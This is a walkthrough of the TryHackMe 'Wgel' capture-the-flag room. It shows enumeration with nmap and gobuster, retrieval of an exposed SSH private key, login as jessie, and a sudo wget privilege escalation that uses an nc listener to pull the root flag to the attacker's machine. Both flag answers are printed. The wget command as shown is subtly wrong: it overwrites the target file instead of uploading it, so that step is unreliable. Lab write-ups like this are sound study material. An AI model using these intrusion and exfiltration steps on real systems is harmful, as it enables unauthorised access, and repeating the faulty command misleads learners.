# Wgel Walkthrough
### Link
- https://tryhackme.com/room/wgelctf
---
### Taks 
**Question**
###### Compromise this machine and obtain user flag

# Enumeration
```
nmap -sC -sV [IP]
```

In the result, we can see 2 ports: **22** and **80**
Another interesting information: the targeted machine is **Apache server** version **2.4.18**

Let's check the source code of the webpage. If you scroll down, you can find a key information about a potential username: **jessie**

```
sudo gobuster dir -u http://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Finding: //10.10.44.238/**sitemap/**

Let's expore this webpage. Looks like a commercial website.

We can use one more time gobuster to check all directories from /sitemap

```
sudo gobuster dir -u http://[IP]/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We found amny directories but one of them is really important : **.ssh/**

Move to this directory and you found the id_rsa. Now we can SSH the server by using this rsa key ^^ 

# Exploitation

Download the id_rsa file

```
wget http://[IP]/sitemap/.ssh/id_rsa
```

Copy the id_rsa content to a text file

```
cp id_rsa key.txt
```

Change the file rights
```
chmod 600 key.txt
```

Next step, use the key to log into the server through SSH

```
ssh -i key.txt jessie@[IP]
```

Now we can navigate in the server and find the user flag. This flag is in the **Documents** folder

**Answer**
###### 057c67131c3d5e42dd5cd3075b198ff6


# Privilege escalation

Now we can check what command jessie is able to perform as root

```
sudo -l
```

Result: /usr/bin/wget 

Let's check https://gtfobins.github.io/gtfobins/wget/

We just need to follow the pattern indicated under SUDO

- First : start listener and send the information to a text file

```
nc -nlvp 4444 > root_flag.txt
```

- Second : Follow the instructions from gtfobins ^^

```
jessie@CorpOne:~/Documents$ URL=http://[local machine IP]:4444/
jessie@CorpOne:~/Documents$ LFILE=/root/root_flag.txt
jessie@CorpOne:~/Documents$ sudo wget $URL -O $LFILE
```

- Third: check the root_flag.txt in your local machine

**Answer**
###### b1b968b37519ad1daa6408188649263d

